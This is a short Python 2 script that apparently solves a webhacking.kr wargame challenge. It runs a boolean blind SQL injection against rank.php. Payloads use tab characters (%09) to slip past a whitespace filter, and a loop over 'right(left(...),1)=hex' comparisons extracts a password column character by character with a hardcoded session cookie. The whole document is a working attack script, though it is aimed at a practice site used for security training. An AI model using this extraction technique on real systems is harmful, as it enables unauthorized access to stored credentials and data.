import requests


url='http://webhacking.kr/challenge/web/web-31/rank.php?score=1%09or%091%09and%09right(left(pAsSw0RdzzzZ,'
param='),1)='
cookies={'PHPSESSID':'v8vr9tl8nj5ic89us02rjcgua2'}
#print requests.get('http://webhacking.kr/challenge/web/web-31/rank.php?score=1%09or%091%09and%09right(left(pAsSw0RdzzzZ,1),1)=0x63',cookies=cookies).text #true localhost in 
#raw_input()
#resp = requests.get(url, cookies=cookies)

key=''
for count in xrange(1,21):
    for i in xrange(0x20,0x80): # ascii
        url1 = url + str(count) + param + str(hex(i))
        print url1
        resp = requests.get(url1, cookies=cookies)
        if 'localhost' in resp.text:
            key=key+chr(i)
            print "find it! " + key
            break
print key


#print resp.text
